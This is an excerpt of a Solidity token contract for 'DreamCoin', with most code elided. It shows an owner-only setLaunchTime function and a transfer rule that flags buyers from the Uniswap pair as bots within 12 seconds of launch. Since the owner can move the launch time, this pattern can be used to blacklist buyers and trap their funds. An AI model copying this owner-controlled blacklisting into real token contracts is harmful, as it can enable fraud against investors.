...
contract DreamCoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = " DreamCoin";
    string private _symbol = "Dream";
    uint8 private _decimals = 9;

    uint public launchedTime = 0;
    address payable public marketingWalletAddress = payable(0x9881F020E53817B6bDBD7758c7e7b51cE333e61e); // Marketing Address
    address payable public BuybackWalletAddress = payable(0xE10ca6B09973180AFCF1b837353DCbf534f80ff0); // Buyback Address
	address public OwnerAddress =0x000000000000000000000000000000000000dEaD;
    ...
    uint256 private minimumTokensBeforeSwap = 666 * 10** _decimals; 
    ...
    function setLaunchTime(uint time) public onlyOwner {
        launchedTime = time;
    }
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if(sender == uniswapPair) {
                    if (block.timestamp < launchedTime + 12) {                  
                        addBot(recipient);
                    }
                }
